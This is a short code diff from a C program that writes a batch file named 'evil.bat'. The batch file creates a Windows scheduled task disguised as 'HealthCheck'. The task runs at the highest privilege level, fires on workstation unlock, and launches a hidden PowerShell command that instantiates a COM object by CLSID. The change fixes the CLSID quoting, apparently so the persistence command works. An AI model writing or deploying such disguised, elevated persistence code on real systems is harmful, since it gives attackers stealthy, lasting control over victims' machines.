@@ -76,7 +76,7 @@ int main()
 	
 	//File Vars
 	const char* filename = "c:\\Users\\saurav\\Desktop\\evil.bat";
-    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID(29F458BE-8866-11D5-A3DD-00B0D0F3BAA7))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System[(EventID=4801)]]\"";
+    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID('''29F458BE-8866-11D5-A3DD-00B0D0F3BAA7'''))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System[(EventID=4801)]]\"";
 
 	//Create a File
 	HANDLE hfile;
